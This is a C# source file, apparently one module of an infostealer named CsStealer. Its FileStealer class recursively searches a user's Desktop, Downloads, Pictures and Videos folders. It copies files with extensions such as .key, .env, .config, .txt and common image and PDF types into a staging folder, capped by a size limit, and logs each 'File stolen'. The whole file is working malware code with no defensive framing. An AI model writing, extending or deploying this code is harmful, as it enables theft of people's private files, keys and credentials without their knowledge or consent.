using System;
using System.Diagnostics;

namespace CsStealer
{
    class FileStealer
    {
        public static void GetFiles()
        {
            static long GetDirectorySize(DirectoryInfo dir)
            {
                if (!dir.Exists)
                    return 0;

                long size = 0;

                size += dir.GetFiles().Sum(f => f.Length);

                foreach (DirectoryInfo subDir in dir.GetDirectories())
                {
                    size += GetDirectorySize(subDir);
                }

                return size;
            }

            static void ProcessDirectory(string _Dir)
            {
                string[] FileExtensions = { ".png", ".pdf", ".jpeg", ".jpg", ".webp", ".txt", ".key", ".locked", ".avif", ".svg", ".env", ".config" };
                string StolenFilesDist = Path.Combine(Config.OutputDir, "Files");

                foreach (string FullPath in Directory.GetFileSystemEntries(_Dir))
                {

                    if (GetDirectorySize(new DirectoryInfo(StolenFilesDist)) >= Config.StolenFilesLogMaxSize * 1024 * 1024)
                    {
                        return;
                    }

                    if (Directory.Exists(FullPath))
                    {
                        ProcessDirectory(FullPath);
                        continue;
                    }

                    if (FileExtensions.Contains(Path.GetExtension(FullPath)))
                    {
                        try
                        {
                            if (new FileInfo(FullPath).Length <= Config.StolenFilesLogMaxSize * 1024 * 1024 - GetDirectorySize(new DirectoryInfo(StolenFilesDist)))
                            {
                                File.Copy(FullPath, Path.Combine(StolenFilesDist, Path.GetFileName(FullPath)));
                                Debugger.Debug("INFO", $"File stolen : {Path.GetFileName(FullPath)}");
                            }
                        }
                        catch (Exception ex)
                        {
                            Debugger.Debug("WARNING", $"Couldn't steal {Path.GetFileName(FullPath)} : {ex.Message}");
                        }
                    }
                }
            }

            string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string Downloads = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
            string Pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
            string Videos = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);

            Directory.CreateDirectory(Path.Combine(Config.OutputDir, "Files"));

            string[] Pathes = { Desktop, Downloads, Pictures, Videos };

            foreach (string _Path in Pathes)
            {
                ProcessDirectory(_Path);
            }
        }
    }
}